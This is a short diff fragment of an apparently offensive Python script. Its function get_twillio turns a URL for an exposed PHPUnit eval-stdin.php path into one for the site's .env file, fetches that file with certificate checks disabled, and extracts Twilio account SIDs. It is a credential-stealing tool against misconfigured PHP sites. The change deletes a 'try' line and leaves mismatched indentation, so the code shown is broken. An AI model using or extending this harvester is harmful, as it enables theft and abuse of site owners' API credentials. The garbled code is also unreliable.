@@ -59,7 +59,7 @@ api_twillio = 0
 def get_twillio(url):
 	global api_twillio
 	fin = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/.env")
-        try
+       
                 spawn = requests.get(fin, timeout=15, verify=False).text
                 if "TWILIO" in spawn:
                         acc_sid = re.findall("\nTWILIO_ACCOUNT_SID=(.*?)\n", spawn)[0]
